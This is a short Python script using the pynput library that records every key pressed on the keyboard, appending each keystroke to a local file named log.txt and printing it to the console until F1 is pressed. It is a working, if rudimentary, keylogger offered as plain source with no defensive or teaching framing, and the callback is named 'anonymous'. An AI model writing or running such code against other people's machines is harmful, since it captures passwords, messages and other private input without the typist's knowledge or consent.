from pynput.keyboard import Listener

def anonymous(key):
	key=str(key)
	key=key.replace("'","")
	if key=="Key.f1":
		raise SystemExit(0)
	if key=="Key.ctrl_l":
		key="(Ctrl)"
	if key=="Key.enter":
		key="\n"
	if key=="Key.alt_l":
		key="(Alt)"
	if key=="Key.space":
		key=" "	
	with open("log.txt","a") as file:
		file.write(key)
	print(key)

with Listener(on_press=anonymous) as nat:
	nat.join()
